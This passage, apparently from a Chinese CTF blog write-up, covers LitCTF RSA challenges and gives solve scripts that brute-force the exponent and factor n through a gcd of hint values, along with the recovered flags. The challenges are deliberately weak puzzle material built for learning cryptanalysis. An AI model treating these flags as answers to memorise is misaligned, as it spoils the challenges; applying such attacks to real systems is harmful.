number">25920961707523393202281300218444176129734572566815781137488940145677301500180714145402663962373623882683655757546713176923316428191765157386415468883815905581966232659296756935108128028157735278704173240867754374892767863985119564774915890766313799183822643494869775607043330683224121234927784433937849569120283272329925062133702698267726766476110289877776286080853490841837897993369872640809289989540435112046742658888426704252633322563361442888492873827942589957261396606340845665522400646771232316872444568013520651608356878655632725425106340256031308528158877727958784150436116095788759918507442721063497464001672</span><span class="token punctuation">,</span> <span class="token number">13263786466446190163016008769836220535269357696454674792666135258902640846903309780108315355392508130227345512883180524670260067683978830659316889987124447343297390324463103766540103214985414999778290407008190424180154779235834484101584174703692738403343419550940166812669376385233441159764013001794070232476009158915966454070958519878855933028785291151945528736387913371707135653596226023268592330842008453104190134667308270525900634583278545983101946869551676698088147890541479096323734726116488316329827416755818060204664181280485697259466218350842103872751987842240867163996948996727825810630964777385967911053901</span><span class="token punctuation">,</span> <span class="token number">6253489839553538192995294139816446969824750751774728963617638345595670445770677500921617837218605680169746240573789832579137206230177143500699620111070145585461358354523003959756713830108697398762585026303196668650471722612722372863973566811324151291707208671745892059398682725808801715988328719567890446420981480784833951835550433358928430667547317456646990287369723084794020241264506154652275756123282486762023979426752588250225435784747977075518696454125522814567504866613306081720330538332436897331017796420408357014130003339073229042803329670944110125353218213811432346818713964878168764790792105206633440354005</span><span class="token punctuation">,</span> <span class="token number">5185490165247175755074805103840625687511977590976733896967715184223982955725681935365096951517529730737911572507779959945930556296503873230438433692310842981978848881986205067999307067785730415524359447947414935770806603135319166013408164683315806218163318125978230966989985398051513033616788512784230934142137906332152151059584574222941527730647262944250765844919176013002939308197949589859844618414360065768222159786067710805154244111569645546199262226746460081578671653615283375596665960708242700241780342523448742861815380568359092813225600016747957517992666799497302478221946509254852979437130583539850985247422</span><span class="token punctuation">,</span> <span class="token number">1748234508408435343229319253644625402817707176509451594647354284826288727338735967235360246609210161049023834307132290872525340273117113455850690260255921823613621383639409134488848519959372177408937889998552431530493839856756914185531673290249084408278489645057787655359507244021027375565961471003583528932265312366403288884176948556324167675395562225956088863571715251876674710333918813480215719798596428736037441464450389735436535142133977551778467378533427938402690627170065561491269748888688911598444983102702261665208037447965537895418969759387684448834920453303484908559802952752182953165141625674023904414158</span><span class="token punctuation">,</span> <span class="token number">8335009241673468873253675068463589266426701056401774737990647304778993560605655347351631416630769577522424783603153098182609522990968188535194397812386924076809847791156568504352196579970447867606517135531565802449373639411293098029825159629692422202058452950834073234658264013415977347155192720165418683784735863643368164054960138519912292186928345518922656777075501616408802833213759105274620228201695472893761054437789976692657170111413189445894590722931833376629118468092175170858255694444972297979072766528207056455924414294930988285253186403605383727454401973318032223978796412991222953728595468797201373820622</span><span class="token punctuation">,</span> <span class="token number">5976772453334984518311442738240004799220403662435440872185530863193424233037367952925902243175234771035939695813307154967530503941081645934538688267920825967077726208002575899575371222695901346361307413004351281869655229087644917183767240951265807406293078230174759543645470570834782744332808979716142354429389228605592485271438778026468985249730030159932637979600514791593524263931036554765213297195922837236962842381131840868115187459577702023810124989825582700575011520568245435377833934768593346195065831458857440454704013911127816011037625063876159283174160162690848395114549568308205531592017492613772445173774</span><span class="token punctuation">,</span> <span class="token number">25920961707523393202281300218444176129734572566815781137488940145677301500180714145402663962373623882683655757546713176923316428191765157386415468883815905581966232659296756935108128028157735278704173240867754374892767863985119564774915890766313799183822643494869775607043330683224121234927784433937849569120283272329925062133702698267726766476110289877776286080853490841837897993369872640809289989540435112046742658888426704252633322563361442888492873827942589957261396606340845665522400646771232316872444568013520651608356878655632725425106340256031308528158877727958784150436116095788759918507442721063497464001672</span><span class="token punctuation">,</span> <span class="token number">5185490165247175755074805103840625687511977590976733896967715184223982955725681935365096951517529730737911572507779959945930556296503873230438433692310842981978848881986205067999307067785730415524359447947414935770806603135319166013408164683315806218163318125978230966989985398051513033616788512784230934142137906332152151059584574222941527730647262944250765844919176013002939308197949589859844618414360065768222159786067710805154244111569645546199262226746460081578671653615283375596665960708242700241780342523448742861815380568359092813225600016747957517992666799497302478221946509254852979437130583539850985247422</span><span class="token punctuation">,</span> <span class="token number">1717028738196915227260339129573501065417757436024070728399837662683474643676720266190852688571851260086024584528234004503770202991702828738603236485267929860326697228640681326889845794391744206929580676537615769150484083242039924741303807364343064097449659558370778499818290907827480001580408520014110979083082316647497828342236619136282585160822630608240519352654269080203964531142386474415714079196749108940162898716817139452352062000261548631825989143362746715121123292436275957550673873937398160148303975715603319819731258894296533494152025775404106195174909015831441339509280028585399046169513149752204461930349</span><span class="token punctuation">,</span> <span class="token number">25139940794218635348197118071301083238188918027193611763525774422502805824030159181810808048312828586310375271390658874846166941305171889519472685469675087274773157307133820213186080599249106104274031234797703970573904818411381605617364965926619916397551349237481884885723093798237875561681274880161116978250140685000915537069110074814807782361116104719639226963741990834724296742064451257526339309855861251778350642631845345431897638639307184086434344778694684043943923041302280417162444914203825532942834207262516015206535412006876830590028421616204643350943277314562927607754616803756985741638210493640875844891960</span><span class="token punctuation">,</span> <span class="token number">6452875340997852295275020218749378916760411126851936571996259386760459856313309845592392640856504175949234216794963908475913037761993360407125952607943943083700382006783091443756617877566422165299422992987336811474980284131306966940424642139162441283769172531199959298540627795873212152702317440453079566096174835647147665695679094943137671532124636863128457006714211465119286776747310503452130041649279123753848522079886216732719572247000481047269505214596261386534160935834909921155351371984109147724730932926711831690752003577272018655013647352055561080857579522667684581123594159788011149227192380455462896729962</span><span class="token punctuation">,</span> <span class="token number">20897947836932076779964827384680266669444872541242595584853544810847660781809255811902379402727265984145972717558208216627868351476262475424181241317707734298108218231636329375895362429626917095073694210812814494087830535014117884013936787285440467171742761631884901929078488856204289738449061959822388725333274257861099169377435400465998662612618115681519773625182456433449001773543437767201553703283209697249003117284877232666946456539017194397166088957330100388776645543342462188483091150441369824235427061443229429025534194618806460187812446633057673388068141804189503074739767911838028579099128625845793341901127</span><span class="token punctuation">,</span> <span class="token number">11585318389310082289634538436928729260761907754954731989483654384251165000197213645281370351397028539366128403662173911562239143321895246754339672995138654604980948825905276968754585440593530502031072587489418651687027546522269634035791996102885960686969316226732356317109881863779734224468395519503131972389118986368190443032576070941428487054450651328773394985517568216579647364967614926730248841713741600286001390136757473284393174512577204042060290369663604703262495330209924328523120390710228628984130500686686583318088441875055416917520119056403841430529851364998090755804939747123419334984081027473820456086396</span><span class="token punctuation">]</span></code></pre>
<p>根据首字母’L’求出e</p>
<pre class="language-python" data-language="python"><code class="language-python">c<span class="token operator">=</span><span class="token number">2206795524649235905421691489826312664535869158473992241382107452229902627430789178221234450699214518235612692491501082306158268745610575202210170312762929300421312081998256557805289595256913161318967687803957784191522197708618872099119883772100567610799038030170491575261415069363292331223848994909959222662307903914818692008641789258455591462146141825906954662346647872459477376830019604449386735009274664469596162731339288162705222622464022019805917855614180415135305122287341306358535204977475464107550060171378721195970927993762052901722822033817371589592984818877687488499315074761849162622037910992107211284008</span>
n <span class="token operator">=</span> <span class="token number">26287684934288536371438030224508784042871268975402791015134838900290249602701092702492594931306572692868654436714501196060619149020850402317982203575250568283872182497606239389480186694649979877566740647822434500023605871516831662099415987589808614777313595453727243531121031390104059097782466650186291076316486240197369759537327997880644540629964227584070506981319936888159712058406052247256554081989035415864476278146328967410452695134756792942103209740186339835071828587981271027235499355298543650516643100665039796305276163706693873611519506528344413021878980171629732211592839945004800782325172828561339662590291</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">65537</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">==</span>c<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
        <span class="token keyword">break</span>
<span class="token comment">#1924</span></code></pre>

<pre class="language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">26287684934288536371438030224508784042871268975402791015134838900290249602701092702492594931306572692868654436714501196060619149020850402317982203575250568283872182497606239389480186694649979877566740647822434500023605871516831662099415987589808614777313595453727243531121031390104059097782466650186291076316486240197369759537327997880644540629964227584070506981319936888159712058406052247256554081989035415864476278146328967410452695134756792942103209740186339835071828587981271027235499355298543650516643100665039796305276163706693873611519506528344413021878980171629732211592839945004800782325172828561339662590291</span>
c_list <span class="token operator">=</span> <span class="token operator">**</span><span class="token operator">*</span>
e<span class="token operator">=</span><span class="token number">1924</span>
flag<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">==</span>c_list<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
            flag<span class="token operator">+=</span>i
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment">#LitCTF&#123;sometim3s_y0u_need_to_rever5e_your_m1nd&#125;</span></code></pre>
<h3 id="common-primes-plus"><a href="#common-primes-plus" class="headerlink" title="common_primes_plus"></a>common_primes_plus</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d

<span class="token keyword">assert</span> a<span class="token operator">*</span>c <span class="token operator">==</span> b<span class="token operator">*</span>d <span class="token operator">+</span> <span class="token number">1</span>
m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

e <span class="token operator">=</span> <span class="token number">65537</span>
hint1 <span class="token operator">=</span> a <span class="token operator">*</span> n1 <span class="token operator">+</span> b <span class="token operator">*</span> n2
hint2 <span class="token operator">=</span> c <span class="token operator">*</span> n1 <span class="token operator">+</span> d <span class="token operator">*</span> n2
c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n1<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"n1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n1<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"hint1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>hint1<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"hint2 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>hint2<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">'''
n1 = 72619153900682160072296441595808393095979917106156741746523649725579328293061366133340736822282117284050717527134297532031234706715551253283030119063143935874516054785948327252045453986903379262257406260016876625891582923191913450785482873961282498295762698500898694660964018533698142756095427829906473038053
hint1 = 115150932086321440397498980975794957800400136337062771258224890596200580556053305338941267789684878816176014493153795643655219028833232337281425177163963414534998897852644398384446019097451620742463880027107068960452304016955877225140421899265978792650445328111566277376529454404089066088845864500514742797060500618255170627
hint2 = 166820160267525807953634213157298160399912450930658918773153592459310847514047652216110562360456335336533080444219104489314586122760398361430693763814336759476811490524054588094610387417965626546375189720748660483054863693527537614055954695966458622029711055735399842018236940424665041143785192280089418185085532002136215976
c = 28378912671104261862184597375842174085651209464660064937481961814538145807266472966765374317717522401362019901110151858589886717440587644003368826809403188935808872400614919296641885383025657934630410406898092262104442977722339379234085663757182028529198392480656965957860644395092769333414671609962801212632
'''</span></code></pre>
<p>这个没看懂，看了别人的wp说是<code>p=gcd(hint1.hint2)</code>，不理解，再说吧</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> string
<span class="token keyword">import</span> gmpy2

e<span class="token operator">=</span><span class="token number">65537</span>
n <span class="token operator">=</span> <span class="token number">72619153900682160072296441595808393095979917106156741746523649725579328293061366133340736822282117284050717527134297532031234706715551253283030119063143935874516054785948327252045453986903379262257406260016876625891582923191913450785482873961282498295762698500898694660964018533698142756095427829906473038053</span>
hint1 <span class="token operator">=</span> <span class="token number">115150932086321440397498980975794957800400136337062771258224890596200580556053305338941267789684878816176014493153795643655219028833232337281425177163963414534998897852644398384446019097451620742463880027107068960452304016955877225140421899265978792650445328111566277376529454404089066088845864500514742797060500618255170627</span>
hint2 <span class="token operator">=</span> <span class="token number">166820160267525807953634213157298160399912450930658918773153592459310847514047652216110562360456335336533080444219104489314586122760398361430693763814336759476811490524054588094610387417965626546375189720748660483054863693527537614055954695966458622029711055735399842018236940424665041143785192280089418185085532002136215976</span>
c <span class="token operator">=</span> <span class="token number">28378912671104261862184597375842174085651209464660064937481961814538145807266472966765374317717522401362019901110151858589886717440587644003368826809403188935808872400614919296641885383025657934630410406898092262104442977722339379234085663757182028529198392480656965957860644395092769333414671609962801212632</span>
p<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>hint1<span class="token punctuation">,</span>hint2<span class="token punctuation">)</span>
q<span class="token operator">=</span>n<span class="token operator">//</span>p
m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#LitCTF&#123;th1s_i5_a_adv4nced_c0mmon_prim3s&#125;</span></code></pre>
<h3 id="真·签到！！！"><a href="#真·签到！！！" class="headerlink" title="真·签到！！！"></a>真·签到！！！</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> enc <span class="token keyword">import</span> flag
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> gmpy2
<span class="token keyword">import</span> random

p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
e <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token operator">**</span><span class="token number">8</span><span class="token punctuation">)</span>
n <span class="token operator">=</span> p<span class="token operator">*</span>q
c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token keyword">for</span> m <span class="token keyword">in</span> flag<span class="token punctuation">]</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"n = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
n = 53779688736203933047434881701980151653423802317221115318252054349550528639605402386823698507644560099402835048990108944258111185574422278737617624691459404487383205558495742477348096557609903091073482529108655721238870718736876917084894146112572318162754496404262394399247602930119945411919174294508800616891
c = [4124398080749553074619843072966405052653858760437326718059791703345965920503569739252697039258403095781261373084359291436131778873009458422798167842256401087702314540530419434366776728534830888673974354635857270349385440098865230210094489169761588857916363734220665484295067349289289937219722492065728599463, 15481644643922585500945090000695562756282558733694376113993997188985665803568510535190119480845091520658885447822873846242168965970319826752836201669345271783173616567609933032017344851978404496594310266471195858958401298265505190354107704046599872108795281982693695588930911349202457222578310220886622884416, 40974022330897595185593668062654482156370823359835540803640174599026663839070218063991563668507393666219642637135525638990455137020424754595250945054931120081475828089632764945575780326199183117119567719177117261011813697975685625263935820428233393538013872760001414320682062909650622706212810667501741354873, 33981786848660496333961506517187714554193615584845878232210394944336780137112027320577548034903832074752598242250089070169817297717880683657379700922708752551349470039462849959879736868560539774248532790598446587204581950938279079907176227710483120279719588731010982317536907131989435797059221285174093962908, 1285910717903203084975787538616625852434321550159180500468441407891029771447865370135113417284148880935400895099397662772912500923680415544536692392496640999237766173745842517211118889788913178800742948591271387743915400252547483363390245549270543581643322229638652142265779266726517677852583628198266108421, 23789203781845502389604138554793333517773526003503743390692470103394090787030629083975882919256262588645554701048271917571850719220017173479370286653555316337255808129285505861937546032314431989480012931420093894536654994001056137216516437854011401289717520452295524972795366753274063468895803833424426506331, 20940208240413900181251095272480030757105866339312310157480925947687648156412725814283553668029566232713480333831122495321031459080649522184580652548367762322620272746907156287431288132170924230190580437501883293037927765862049006329498758245604100845556492302312391684439016854521845339622400243037514523867, 41340655699032850811922590703534124397137469314819785476566566093858629648044627482514797174972386035722096563024583525376236045453451526570126890987183821072119586387364708099135124115856050119661380924186837677285512927400295146789034172166107474252827192261267643468495553148849468493009241668471083048430, 22966360367971968504676737450654736559784526278126249100481690257360113645735823869174095070763996461165850039977914727245980242307319409983699793511352248209423007808171107239738771728438094641440444300596228692729277266556257088686585351869961921410859567001968798590921194402863219621666507877820378827092, 41340655699032850811922590703534124397137469314819785476566566093858629648044627482514797174972386035722096563024583525376236045453451526570126890987183821072119586387364708099135124115856050119661380924186837677285512927400295146789034172166107474252827192261267643468495553148849468493009241668471083048430, 52202475140977838262155766391763349770007617219731559882124842701306589259283233719727463105485402530682922793511867820592726412692298060420804847173813733441078903812811823520344962843237246635665635279928926476628971734748164894875272506105775963532397945641093931037074645811860105881221105902306255621181, 43686732822375527268166781780704145014463398236959129237259540820318050928142217382482854923592727143517945840145245021402367171624497223470640246895897992745217804594441620139099576901221773322604374681094586004810027213343123533228000473640015954168594863999625384697827658129618656763377267113765657637761, 14880134921930262144875287284818967110251827510945998306349834095556559727134453367023956672529927521400098332845397865476485851088348289863395304436600667602897364946074198944367059280853856523321854848231173098875824362694147164421785094924944589659224105370845089374193840009119763660625714201229551202464, 38013516229906731040770728995532120131491416592495253746823605701526767788760134027460299370090486775327164899231056232048607749748639052414737842983659937901990208411978548025212907210373477389757182408450834322391767748006090559771843058148102090701817180898022507797050605846546948706282805015074193093273, 20524906300041996892262239459527462404196257551590250259857365607007677670540302221668693379920161363521285920275466639018409401155313360025405024607708054080526222596947953326605977964045680445269338000371617360892920017917084671528868044975804331654166128752309192614142872384593861258628748764936855953220, 20524906300041996892262239459527462404196257551590250259857365607007677670540302221668693379920161363521285920275466639018409401155313360025405024607708054080526222596947953326605977964045680445269338000371617360892920017917084671528868044975804331654166128752309192614142872384593861258628748764936855953220, 20524906300041996892262239459527462404196257551590250259857365607007677670540302221668693379920161363521285920275466639018409401155313360025405024607708054080526222596947953326605977964045680445269338000371617360892920017917084671528868044975804331654166128752309192614142872384593861258628748764936855953220, 38013516229906731040770728995532120131491416592495253746823605701526767788760134027460299370090486775327164899231056232048607749748639052414737842983659937901990208411978548025212907210373477389757182408450834322391767748006090559771843058148102090701817180898022507797050605846546948706282805015074193093273, 16822859827241912092903301050602204948222809037868347721306013629185546078070142612905867911365364682095817701589155688149474870521437581822944710801232554186762524645518382246152771387652373860849924256464746937608068511622557828364043958392814895625329426982855829366086732912276996321034036018819408951193, 34150153608686108981107806839997156875358767651869050480811448846242725270615327530663889984779854553092120823194108656627949475159285700946138204912775266363022036292515155178325852957375486496328282381365286611916449049601323101141237331480034977207188953388238873934117345088291003788988627587000440491067, 1080077289768974224514697428506714010850637431783677450886962480094680409598510781459495187524547891405762403065728309492525472661717864381505770334364496408759066160232404275108402127205833678508044742271255268139834900230068167627203821637533356900402299478531941413138234500208157822130575455493383047567, 1080077289768974224514697428506714010850637431783677450886962480094680409598510781459495187524547891405762403065728309492525472661717864381505770334364496408759066160232404275108402127205833678508044742271255268139834900230068167627203821637533356900402299478531941413138234500208157822130575455493383047567, 43686732822375527268166781780704145014463398236959129237259540820318050928142217382482854923592727143517945840145245021402367171624497223470640246895897992745217804594441620139099576901221773322604374681094586004810027213343123533228000473640015954168594863999625384697827658129618656763377267113765657637761, 1080077289768974224514697428506714010850637431783677450886962480094680409598510781459495187524547891405762403065728309492525472661717864381505770334364496408759066160232404275108402127205833678508044742271255268139834900230068167627203821637533356900402299478531941413138234500208157822130575455493383047567, 2261213433462723419446068536636649771187144868712624195878985258332075459437123191546644392841202030016957753759317962427017329871785225346154355535823733243490439256337121075737014302820285880854932463336983215343814901470468271086180806826828758278636642722717746069806141466423669570629896086040252059811, 2261213433462723419446068536636649771187144868712624195878985258332075459437123191546644392841202030016957753759317962427017329871785225346154355535823733243490439256337121075737014302820285880854932463336983215343814901470468271086180806826828758278636642722717746069806141466423669570629896086040252059811, 20524906300041996892262239459527462404196257551590250259857365607007677670540302221668693379920161363521285920275466639018409401155313360025405024607708054080526222596947953326605977964045680445269338000371617360892920017917084671528868044975804331654166128752309192614142872384593861258628748764936855953220, 1080077289768974224514697428506714010850637431783677450886962480094680409598510781459495187524547891405762403065728309492525472661717864381505770334364496408759066160232404275108402127205833678508044742271255268139834900230068167627203821637533356900402299478531941413138234500208157822130575455493383047567, 34150153608686108981107806839997156875358767651869050480811448846242725270615327530663889984779854553092120823194108656627949475159285700946138204912775266363022036292515155178325852957375486496328282381365286611916449049601323101141237331480034977207188953388238873934117345088291003788988627587000440491067, 22966360367971968504676737450654736559784526278126249100481690257360113645735823869174095070763996461165850039977914727245980242307319409983699793511352248209423007808171107239738771728438094641440444300596228692729277266556257088686585351869961921410859567001968798590921194402863219621666507877820378827092, 16264894348259769136675550067824857283471919750028043029657185995447205515644739721442713128709898468504029150415861841382906641476195752925950909219618894837821015850329001463680764039265007095540240515692665160125015606879662459432975652875535648068534926380848491577719631224890161757880802939228883185592, 1080077289768974224514697428506714010850637431783677450886962480094680409598510781459495187524547891405762403065728309492525472661717864381505770334364496408759066160232404275108402127205833678508044742271255268139834900230068167627203821637533356900402299478531941413138234500208157822130575455493383047567, 48082751893707411443030173186335305790867819509239136633531599952276619514671134605545456992422479102909480454270136006149473478156585782252929384235054442854349205489546634520955838888639404324251978615664175676633161271815457282615312198983401493084973690137353747061078161134872098033066383487860152411239, 21327622441108572162106669889096334171915319598231314927862632695081879818457106233577588661109578343720589743198154707810708496736138963401446774648179328773413409171869828838434037907816132436438314483017142493175451372700989061258496056410836951234155583628787251073520843683698565432474522538486905480145, 2261213433462723419446068536636649771187144868712624195878985258332075459437123191546644392841202030016957753759317962427017329871785225346154355535823733243490439256337121075737014302820285880854932463336983215343814901470468271086180806826828758278636642722717746069806141466423669570629896086040252059811, 21327622441108572162106669889096334171915319598231314927862632695081879818457106233577588661109578343720589743198154707810708496736138963401446774648179328773413409171869828838434037907816132436438314483017142493175451372700989061258496056410836951234155583628787251073520843683698565432474522538486905480145, 16264894348259769136675550067824857283471919750028043029657185995447205515644739721442713128709898468504029150415861841382906641476195752925950909219618894837821015850329001463680764039265007095540240515692665160125015606879662459432975652875535648068534926380848491577719631224890161757880802939228883185592, 43686732822375527268166781780704145014463398236959129237259540820318050928142217382482854923592727143517945840145245021402367171624497223470640246895897992745217804594441620139099576901221773322604374681094586004810027213343123533228000473640015954168594863999625384697827658129618656763377267113765657637761, 52202475140977838262155766391763349770007617219731559882124842701306589259283233719727463105485402530682922793511867820592726412692298060420804847173813733441078903812811823520344962843237246635665635279928926476628971734748164894875272506105775963532397945641093931037074645811860105881221105902306255621181, 6095619509559019908019352298785640301209234881314970774184941172547625244370412202107112133779358742353812823865176363562807708451451147505179327450732451736668872375390442553984797239930526165727742801338607942940231944774202087146668342653834800543503935286187760190753179319613671205950833349955049912928]
'''</span></code></pre>
<p>还是根据第一个字符’L’爆破e就行了</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tqdm <span class="token keyword">import</span> <span class="token operator">*</span>

n <span class="token operator">=</span> <span class="token number">53779688736203933047434881701980151653423802317221115318252054349550528639605402386823698507644560099402835048990108944258111185574422278737617624691459404487383205558495742477348096557609903091073482529108655721238870718736876917084894146112572318162754496404262394399247602930119945411919174294508800616891</span>
c <span class="token operator">=</span> <span class="token number">4124398080749553074619843072966405052653858760437326718059791703345965920503569739252697039258403095781261373084359291436131778873009458422798167842256401087702314540530419434366776728534830888673974354635857270349385440098865230210094489169761588857916363734220665484295067349289289937219722492065728599463</span>

<span class="token keyword">for</span> e <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token operator">**</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token keyword">if</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span> <span class="token operator">==</span> c<span class="token punctuation">:</span>
         <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
         <span class="token keyword">break</span>
<span class="token comment">#9897777</span></code></pre>
<p>爆出来e是9897777<br>然后继续爆破其他字符即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
n <span class="token operator">=</span> <span class="token number">53779688736203933047434881701980151653423802317221115318252054349550528639605402386823698507644560099402835048990108944258111185574422278737617624691459404487383205558495742477348096557609903091073482529108655721238870718736876917084894146112572318162754496404262394399247602930119945411919174294508800616891</span>
c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4124398080749553074619843072966405052653858760437326718059791703345965920503569739252697039258403095781261373084359291436131778873009458422798167842256401087702314540530419434366776728534830888673974354635857270349385440098865230210094489169761588857916363734220665484295067349289289937219722492065728599463</span><span class="token punctuation">,</span> <span class="token number">15481644643922585500945090000695562756282558733694376113993997188985665803568510535190119480845091520658885447822873846242168965970319826752836201669345271783173616567609933032017344851978404496594310266471195858958401298265505190354107704046599872108795281982693695588930911349202457222578310220886622884416</span><span class="token punctuation">,</span> <span class="token number">40974022330897595185593668062654482156370823359835540803640174599026663839070218063991563668507393666219642637135525638990455137020424754595250945054931120081475828089632764945575780326199183117119567719177117261011813697975685625263935820428233393538013872760001414320682062909650622706212810667501741354873</span><span class="token punctuation">,</span> <span class="token number">33981786848660496333961506517187714554193615584845878232210394944336780137112027320577548034903832074752598242250089070169817297717880683657379700922708752551349470039462849959879736868560539774248532790598446587204581950938279079907176227710483120279719588731010982317536907131989435797059221285174093962908</span><span class="token punctuation">,</span> <span class="token number">1285910717903203084975787538616625852434321550159180500468441407891029771447865370135113417284148880935400895099397662772912500923680415544536692392496640999237766173745842517211118889788913178800742948591271387743915400252547483363390245549270543581643322229638652142265779266726517677852583628198266108421</span><span class="token punctuation">,</span> <span class="token number">23789203781845502389604138554793333517773526003503743390692470103394090787030629083975882919256262588645554701048271917571850719220017173479370286653555316337255808129285505861937546032314431989480012931420093894536654994001056137216516437854011401289717520452295524972795366753274063468895803833424426506331</span><span class="token punctuation">,</span> <span class="token number">20940208240413900181251095272480030757105866339312310157480925947687648156412725814283553668029566232713480333831122495321031459080649522184580652548367762322620272746907156287431288132170924230190580437501883293037927765862049006329498758245604100845556492302312391684439016854521845339622400243037514523867</span><span class="token punctuation">,</span> <span class="token number">41340655699032850811922590703534124397137469314819785476566566093858629648044627482514797174972386035722096563024583525376236045453451526570126890987183821072119586387364708099135124115856050119661380924186837677285512927400295146789034172166107474252827192261267643468495553148849468493009241668471083048430</span><span class="token punctuation">,</span> <span class="token 